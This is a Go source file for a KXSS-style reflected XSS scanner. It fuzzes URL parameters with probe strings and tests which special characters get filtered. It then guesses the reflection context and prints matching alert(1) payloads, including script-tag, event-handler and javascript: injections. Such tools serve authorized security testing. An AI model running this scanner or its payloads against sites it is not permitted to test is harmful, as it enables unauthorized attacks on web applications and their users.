// Package scanner - KXSS (Kali XSS) Style Features
// KXSS is a tool that finds reflected XSS parameters by testing parameter reflection
// This file implements KXSS-style parameter discovery and testing
package scanner

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

// KXSSConfig holds configuration for KXSS-style scanning
type KXSSConfig struct {
	Timeout       time.Duration
	ProxyURL      string
	Cookies       string
	Headers       map[string]string
	AuthHeader    string
	Threads       int
	TestAllParams bool
}

// DefaultKXSSConfig returns default KXSS configuration
func DefaultKXSSConfig() *KXSSConfig {
	return &KXSSConfig{
		Timeout:       10 * time.Second,
		Threads:       10,
		TestAllParams: false,
	}
}

// KXSSResult represents a KXSS scan result
type KXSSResult struct {
	URL               string
	Parameter         string
	Reflected         bool
	Filtered          bool
	Context           string
	FilteredChars     []string
	Vulnerable        bool
	Evidence          string
	SuggestedPayloads []string // Context'e göre önerilen payloadlar
	Probe             string   // Test için kullanılan probe
	ReflectionFormat  string   // Yansıma formatı (raw, encoded, etc.)
}

// KXSSScanner implements KXSS-style parameter testing
type KXSSScanner struct {
	config *KXSSConfig
	client *http.Client
}

// NewKXSSScanner creates a new KXSS scanner
func NewKXSSScanner(config *KXSSConfig) *KXSSScanner {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    100,
		IdleConnTimeout: 90 * time.Second,
	}

	if config.ProxyURL != "" {
		proxyURL, err := url.Parse(config.ProxyURL)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	client := &http.Client{
		Timeout:   config.Timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &KXSSScanner{
		config: config,
		client: client,
	}
}

// GetCommonParameters returns common XSS parameter names (from KXSS wordlist)
func GetCommonParameters() []string {
	return []string{
		"q", "s", "search", "query", "keyword",
		"id", "page", "p", "name", "title",
		"url", "link", "redirect", "return", "returnUrl", "return_url",
		"next", "goto", "target", "dest", "destination",
		"callback", "jsonp", "cb", "function",
		"message", "msg", "comment", "content", "body",
		"data", "input", "value", "val", "text",
		"email", "mail", "user", "username", "login",
		"password", "pass", "pwd", "token",
		"code", "error", "err", "status",
		"lang", "language", "locale", "country",
		"category", "cat", "type", "format",
		"action", "do", "cmd", "command", "exec",
		"file", "filename", "path", "dir", "directory",
		"template", "view", "render", "html",
		"style", "css", "theme", "skin",
		"width", "height", "size", "limit",
		"start", "end", "from", "to",
		"sort", "order", "by",
		"filter", "where", "searchfor",
		"fields", "include", "exclude", "expand",
		"per_page", "perpage", "offset",
		"cursor", "after", "before",
		"version", "v", "api_version",
		"_method", "_token", "_csrf",
		"continue", "returnTo", "return_to",
		"client_id", "client_secret", "redirect_uri",
		"scope", "state", "nonce", "response_type",
		"operationName",
	}
}

// ScanURL performs KXSS-style scanning on a URL
func (k *KXSSScanner) ScanURL(targetURL string) ([]KXSSResult, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	// Get existing parameters
	existingParams := parsedURL.Query()

	var results []KXSSResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Test existing parameters
	for paramName := range existingParams {
		wg.Add(1)
		go func(param string) {
			defer wg.Done()
			result := k.testParameter(targetURL, param)
			mu.Lock()
			results = append(results, result)
			mu.Unlock()
		}(paramName)
	}

	// Test common parameters from wordlist
	if k.config.TestAllParams {
		baseURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, parsedURL.Path)
		paramChan := make(chan string, 100)

		// Start workers
		for i := 0; i < k.config.Threads; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for param := range paramChan {
					// Skip if already tested
					if existingParams.Get(param) != "" {
						continue
					}
					testURL := fmt.Sprintf("%s?%s=test", baseURL, param)
					result := k.testParameter(testURL, param)
					if result.Reflected {
						mu.Lock()
						results = append(results, result)
						mu.Unlock()
					}
				}
			}()
		}

		// Send parameters
		params := GetCommonParameters()
		for _, param := range params {
			paramChan <- param
		}
		close(paramChan)
	}

	wg.Wait()

	return results, nil
}

// testParameter tests a single parameter for reflection
func (k *KXSSScanner) testParameter(targetURL, paramName string) KXSSResult {
	result := KXSSResult{
		URL:       targetURL,
		Parameter: paramName,
	}

	// Generate unique probe
	probe := generateKXSSProbe()

	// Build test URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return result
	}

	params := parsedURL.Query()
	params.Set(paramName, probe)
	parsedURL.RawQuery = params.Encode()
	testURL := parsedURL.String()

	// Make request
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return result
	}

	k.setHeaders(req)

	resp, err := k.client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	if err != nil {
		return result
	}

	bodyStr := string(body)

	// Probe'u kaydet
	result.Probe = probe

	// Check if probe is reflected - farklı formatlarda kontrol et
	reflectionFormat := ""
	if strings.Contains(bodyStr, probe) {
		reflectionFormat = "raw"
	}
	
	// URL encoded kontrol
	if reflectionFormat == "" {
		encodedProbe := url.QueryEscape(probe)
		if strings.Contains(bodyStr, encodedProbe) {
			reflectionFormat = "url-encoded"
		}
	}
	
	if reflectionFormat != "" {
		result.Reflected = true
		result.ReflectionFormat = reflectionFormat
		result.Evidence = extractEvidence(bodyStr, probe)

		// Check for filtering - özel karakterleri test et
		result.FilteredChars = k.testSpecialCharFiltering(targetURL, paramName)
		result.Filtered = len(result.FilteredChars) > 0

		// Determine context
		result.Context = k.detectContext(bodyStr, probe)

		// Check if potentially vulnerable
		result.Vulnerable = k.isPotentiallyVulnerable(bodyStr, probe, result.Context)

		// Context'e göre payload önerileri ekle
		result.SuggestedPayloads = GetPayloadsForContext(result.Context, result.FilteredChars)
	}

	return result
}

// setHeaders sets request headers
func (k *KXSSScanner) setHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	if k.config.Cookies != "" {
		req.Header.Set("Cookie", k.config.Cookies)
	}

	if k.config.AuthHeader != "" {
		req.Header.Set("Authorization", k.config.AuthHeader)
	}

	for key, value := range k.config.Headers {
		req.Header.Set(key, value)
	}
}

// detectFiltering detects which characters are filtered
func (k *KXSSScanner) detectFiltering(body, probe string) []string {
	var filtered []string

	// Test characters that are commonly filtered
	testChars := []string{"<", ">", "'", "\"", "&", ";", "(", ")", "{", "}", "`"}

	for _, char := range testChars {
		testProbe := probe + char
		if !strings.Contains(body, testProbe) && strings.Contains(body, probe) {
			// The probe is reflected but with the added char it's not
			// This might indicate filtering
			filtered = append(filtered, char)
		}
	}

	return filtered
}

// testSpecialCharFiltering tests special characters with actual requests to detect filtering
func (k *KXSSScanner) testSpecialCharFiltering(targetURL, paramName string) []string {
	var filtered []string
	
	// Test characters that are commonly filtered
	testChars := map[string][]string{
		"<":  {"<", "&lt;", "%3C", "%3c"},
		">":  {">", "&gt;", "%3E", "%3e"},
		"'":  {"'", "&#39;", "&#x27;", "%27"},
		"\"": {"\"", "&quot;", "%22"},
		"&":  {"&", "&amp;", "%26"},
		";":  {";", "%3B", "%3b"},
		"(":  {"(", "%28"},
		")":  {")", "%29"},
		"{":  {"{", "%7B", "%7b"},
		"}":  {"}", "%7D", "%7d"},
		"`":  {"`", "%60"},
	}
	
	// Use a fixed unique probe for consistency
	baseProbe := fmt.Sprintf("kxssfilter%d", time.Now().UnixNano()%10000)
	
	for char, encodedForms := range testChars {
		testProbe := baseProbe + char
		
		// Build test URL
		parsedURL, err := url.Parse(targetURL)
		if err != nil {
			continue
		}
		
		params := parsedURL.Query()
		params.Set(paramName, testProbe)
		parsedURL.RawQuery = params.Encode()
		testURL := parsedURL.String()
		
		// Make request
		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}
		
		k.setHeaders(req)
		
		resp, err := k.client.Do(req)
		if err != nil {
			continue
		}
		
		body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
		resp.Body.Close()
		if err != nil {
			continue
		}
		
		bodyStr := string(body)
		
		// Check if the base probe is reflected at all
		if !strings.Contains(bodyStr, baseProbe) {
			// Base probe not found, skip this test
			continue
		}
		
		// Check if the character appears in ANY form (raw or encoded)
		charFound := false
		for _, form := range encodedForms {
			probeWithForm := baseProbe + form
			if strings.Contains(bodyStr, probeWithForm) {
				charFound = true
				break
			}
		}
		
		// If character is not found in any form, it's filtered
		if !charFound {
			filtered = append(filtered, char)
		}
	}
	
	return filtered
}

// detectContext determines the reflection context
func (k *KXSSScanner) detectContext(body, probe string) string {
	idx := strings.Index(body, probe)
	if idx == -1 {
		return "unknown"
	}

	// Get surrounding context
	start := idx - 100
	if start < 0 {
		start = 0
	}
	end := idx + len(probe) + 100
	if end > len(body) {
		end = len(body)
	}

	context := body[start:end]
	contextLower := strings.ToLower(context)

	// Check for script context
	if strings.Contains(contextLower, "<script") && !strings.Contains(contextLower, "</script>") {
		return "script"
	}

	// Check for attribute context
	if strings.Count(context, "\"")%2 == 1 || strings.Count(context, "'")%2 == 1 {
		return "attribute"
	}

	// Check for HTML context
	if strings.Contains(contextLower, "<") && strings.Contains(contextLower, ">") {
		return "html"
	}

	return "text"
}

// isPotentiallyVulnerable checks if the reflection is potentially vulnerable
func (k *KXSSScanner) isPotentiallyVulnerable(body, probe, context string) bool {
	// Check if dangerous characters are reflected without encoding
	dangerousChars := []string{"<", ">", "'", "\""}

	for _, char := range dangerousChars {
		testStr := probe + char
		if strings.Contains(body, testStr) {
			return true
		}
	}

	// Check for specific context vulnerabilities
	switch context {
	case "script":
		// In script context, check if quotes are reflected
		if strings.Contains(body, "'"+probe+"'") || strings.Contains(body, "\""+probe+"\"") {
			return true
		}
	case "attribute":
		// In attribute context, check if we can break out
		if strings.Contains(body, "=") {
			return true
		}
	}

	return false
}

// generateKXSSProbe generates a unique probe string
func generateKXSSProbe() string {
	return fmt.Sprintf("kxss_%d_%s", time.Now().UnixNano(), randomString(6))
}

// GetPayloadsForContext returns context-aware payload suggestions
func GetPayloadsForContext(context string, filteredChars []string) []string {
	// Filtrelenen karakterleri kontrol et
	hasFilter := func(char string) bool {
		for _, f := range filteredChars {
			if f == char {
				return true
			}
		}
		return false
	}

	var payloads []string

	switch context {
	case "script":
		if !hasFilter("'") {
			payloads = append(payloads, "';alert(1);//")
			payloads = append(payloads, "'-alert(1)-'")
		}
		if !hasFilter("\"") {
			payloads = append(payloads, "\";alert(1);//")
			payloads = append(payloads, "\"-alert(1)-\"")
		}
		if !hasFilter("<") && !hasFilter(">") {
			payloads = append(payloads, "</script><script>alert(1)</script>")
		}
		// Template literal
		if !hasFilter("`") {
			payloads = append(payloads, "`;alert(1);//")
		}
		// Eğer hiçbir şey filtrelenmemişse alternatifler dene
		if len(filteredChars) == 0 {
			payloads = append(payloads, "';alert(1);//")
			payloads = append(payloads, "\";alert(1);//")
		}

	case "attribute":
		if !hasFilter("\"") {
			payloads = append(payloads, "\" onerror=alert(1) ")
			payloads = append(payloads, "\" onload=alert(1) ")
			payloads = append(payloads, "\" autofocus onfocus=alert(1) ")
		}
		if !hasFilter("'") {
			payloads = append(payloads, "' onerror=alert(1) ")
			payloads = append(payloads, "' onload=alert(1) ")
			payloads = append(payloads, "' autofocus onfocus=alert(1) ")
		}
		if !hasFilter("`") {
			payloads = append(payloads, "` onerror=alert(1) ")
		}
		// Eğer hiçbir şey filtrelenmemişse alternatifler dene
		if len(filteredChars) == 0 {
			payloads = append(payloads, "\" onerror=alert(1) ")
			payloads = append(payloads, "' onerror=alert(1) ")
		}

	case "html":
		if !hasFilter("<") && !hasFilter(">") {
			payloads = append(payloads, "<script>alert(1)</script>")
			payloads = append(payloads, "<img src=x onerror=alert(1)>")
			payloads = append(payloads, "<svg onload=alert(1)>")
			payloads = append(payloads, "<body onload=alert(1)>")
			payloads = append(payloads, "<iframe src=javascript:alert(1)>")
		}
		// Eğer < ve > filtrelenmişse, alternatif payloadlar dene (ama HTML entity kullanma)
		if hasFilter("<") || hasFilter(">") {
			// Filtrelenmişse event handler tabanlı payloadlar dene
			payloads = append(payloads, "\" onerror=alert(1) ")
			payloads = append(payloads, "' onerror=alert(1) ")
			payloads = append(payloads, " onmouseover=alert(1) ")
			payloads = append(payloads, " onload=alert(1) ")
		}

	case "url":
		payloads = append(payloads, "javascript:alert(1)")
		payloads = append(payloads, "javascript:alert(1)//")
		if !hasFilter("<") && !hasFilter(">") {
			payloads = append(payloads, "data:text/html,<script>alert(1)</script>")
		}

	default:
		// Genel payloadlar - her zaman dene
		payloads = append(payloads, "<script>alert(1)</script>")
		payloads = append(payloads, "<img src=x onerror=alert(1)>")
		payloads = append(payloads, "javascript:alert(1)")
		payloads = append(payloads, "';alert(1);//")
		payloads = append(payloads, "\" onerror=alert(1) ")
	}

	// Eğer hiç payload eklenmemişse, en azından bazı temel payloadlar dene
	if len(payloads) == 0 {
		payloads = append(payloads, "<script>alert(1)</script>")
		payloads = append(payloads, "<img src=x onerror=alert(1)>")
		payloads = append(payloads, "javascript:alert(1)")
	}

	return payloads
}

// PrintKXSSResults prints KXSS results
func PrintKXSSResults(results []KXSSResult) {
	// Sadece yansıyan parametreleri filtrele
	var reflectedResults []KXSSResult
	for _, r := range results {
		if r.Reflected {
			reflectedResults = append(reflectedResults, r)
		}
	}

	if len(reflectedResults) == 0 {
		color.Yellow("[*] No reflected parameters found")
		return
	}

	color.Cyan("\n┌─────────────────────────────────────────────────┐")
	color.Cyan("│            KXSS REFLECTION RESULTS              │")
	color.Cyan("└─────────────────────────────────────────────────┘")
	color.Cyan("[*] Found %d reflected parameters", len(reflectedResults))

	for i, r := range reflectedResults {
		fmt.Println()
		if r.Vulnerable {
			color.Red("════════ Parameter #%d [VULNERABLE] ════════", i+1)
			color.Red("  Parameter: %s", r.Parameter)
			color.Red("  Probe: %s", r.Probe)
			color.Red("  Format: %s", r.ReflectionFormat)
			color.Red("  Context: %s", r.Context)
			color.Yellow("  URL: %s", r.URL)
			if len(r.FilteredChars) > 0 {
				color.Yellow("  Filtered Chars: %v", r.FilteredChars)
			} else {
				color.Green("  Filtered Chars: NONE (all chars pass)")
			}
			if len(r.SuggestedPayloads) > 0 {
				color.Cyan("  Suggested Payloads:")
				for _, p := range r.SuggestedPayloads {
					color.White("    → %s", p)
				}
			}
		} else {
			color.Yellow("════════ Parameter #%d [REFLECTED] ════════", i+1)
			color.Yellow("  Parameter: %s", r.Parameter)
			color.Yellow("  Probe: %s", r.Probe)
			color.Yellow("  Format: %s", r.ReflectionFormat)
			color.Yellow("  Context: %s", r.Context)
			color.Cyan("  URL: %s", r.URL)
			if len(r.FilteredChars) > 0 {
				color.Yellow("  Filtered Chars: %v", r.FilteredChars)
			} else {
				color.Green("  Filtered Chars: NONE (all chars pass)")
			}
			if len(r.SuggestedPayloads) > 0 {
				color.Cyan("  Try Payloads:")
				for _, p := range r.SuggestedPayloads {
					color.White("    → %s", p)
				}
			}
		}
	}
	fmt.Println()
}
